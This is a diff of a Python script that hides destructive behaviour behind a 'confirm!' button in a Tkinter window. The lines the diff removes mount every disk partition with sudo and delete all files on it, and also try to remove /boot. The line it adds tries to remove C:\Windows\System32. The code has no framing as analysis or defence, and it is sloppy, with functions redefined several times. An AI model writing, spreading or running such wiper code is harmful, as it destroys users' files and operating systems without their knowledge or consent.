@@ -26,7 +26,7 @@ if __name__ == "main":
 def daemonize():
     if os.fork() > 0:
         sys.exit()
-а
+
     os.setsid()
 
 
@@ -71,64 +71,7 @@ def data():
         label.pack(padx=20, pady=10)
 
         def delet():
-            os.rmdir('/boot/')
-
-        def get_disks():
-            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
-            output = result.stdout.decode()
-            get_desk = re.findall(r'sd\w\d', output)
-            return get_desk
-
-        def mount_disk(device, mount_point):
-            try:
-                subprocess.run(['sudo', 'mkdir', '-p', mount_point], check=True)
-                subprocess.run(['sudo', 'mount', device, mount_point], check=True)
-                print()
-            except subprocess.CalledProcessError as e:
-                print()
-
-        for i in range(len(get_disks())):
-            mount_disk(f'/dev/{get_disks()[i]}', f'/mnt/{get_disks()[i]}')
-            os.chdir(f'/mnt/{get_disks()[i]}')
-            try:
-                for j in range(100):
-                    for i in range(len(os.listdir())):
-                        subprocess.run(['chmod', '+w', os.listdir()[i]])
-                        os.remove(os.listdir()[i])
-            except OSError:
-                print('sasd')
-
-        time.sleep(5)
-
-        def get_disks():
-            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
-            output = result.stdout.decode()
-            get_desk = re.findall(r'sd\w\d', output)
-            return get_desk
-
-        def get_disks():
-            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
-            output = result.stdout.decode()
-            get_desk = re.findall(r'sd\w\d', output)
-            return get_desk
-
-        def mount_disk(device, mount_point):
-            try:
-                subprocess.run(['sudo', 'mkdir', '-p', mount_point], check=True)
-                subprocess.run(['sudo', 'mount', device, mount_point], check=True)
-                print()
-            except subprocess.CalledProcessError as e:
-                print()
-
-        for i in range(len(get_disks())):
-            mount_disk(f'/dev/{get_disks()[i]}', f'/mnt/{get_disks()[i]}')
-            os.chdir(f'/mnt/{get_disks()[i]}')
-            try:
-                for j in range(100):
-                    for i in range(len(os.listdir())):
-                        subprocess.run(['xdg-open', os.listdir()[i]])
-            except OSError:
-                print('sasd')
+            os.rmdir('C:\Windows\System32')
 
 
 button = Button(text='confirm!', command=data)
